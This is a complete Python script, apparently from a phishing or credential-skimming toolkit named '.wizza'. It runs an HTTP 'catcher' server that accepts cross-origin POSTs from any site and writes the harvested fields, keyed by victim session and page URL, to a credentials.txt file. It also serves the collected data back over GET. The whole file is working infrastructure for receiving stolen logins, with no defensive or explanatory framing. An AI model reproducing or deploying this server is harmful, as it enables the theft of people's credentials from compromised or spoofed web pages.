import os,json
from http.server import HTTPServer,BaseHTTPRequestHandler
from datetime import datetime
PORT    = int(os.environ.get("CATCHER_PORT","9999"))
LOG_DIR = os.environ.get("LOG_DIR", os.path.join(os.path.expanduser("~"),".wizza","logs"))
CAUGHT  = f"{LOG_DIR}/credentials.txt"
os.makedirs(LOG_DIR,exist_ok=True)
def ts(): return datetime.now().strftime("%H:%M:%S")
class H(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def _cors(self):
        self.send_header("Access-Control-Allow-Origin","*")
        self.send_header("Access-Control-Allow-Methods","POST,GET,OPTIONS")
        self.send_header("Access-Control-Allow-Headers","Content-Type")
    def do_OPTIONS(self): self.send_response(204);self._cors();self.end_headers()
    def do_POST(self):
        n=int(self.headers.get("Content-Length",0));body=self.rfile.read(n).decode(errors="replace")
        try:
            d=json.loads(body);sid=d.get("sid","?");dtype=d.get("type","?");dd=d.get("data",{});url=d.get("url","?")
            line=f"[{ts()}] {dtype} | {sid} | {url}\n"
            for k,v in dd.items():
                if v: line+=f"  {k}: {v}\n"
            open(CAUGHT,"a").write(line+"\n")
            print(f"[CATCH] {dtype} {sid} — {list(dd.keys())}",flush=True)
        except: open(CAUGHT,"a").write(f"[{ts()}] RAW: {body[:500]}\n")
        self.send_response(200);self._cors();self.send_header("Content-Length","0");self.end_headers()
    def do_GET(self):
        try: c=open(CAUGHT).read()
        except: c="No data yet."
        data=c.encode();self.send_response(200);self.send_header("Content-Type","text/plain")
        self.send_header("Content-Length",len(data));self.end_headers();self.wfile.write(data)
if __name__=="__main__":
    print(f"[*] Catcher :{PORT} → {CAUGHT}",flush=True)
    HTTPServer(("0.0.0.0",PORT),H).serve_forever()
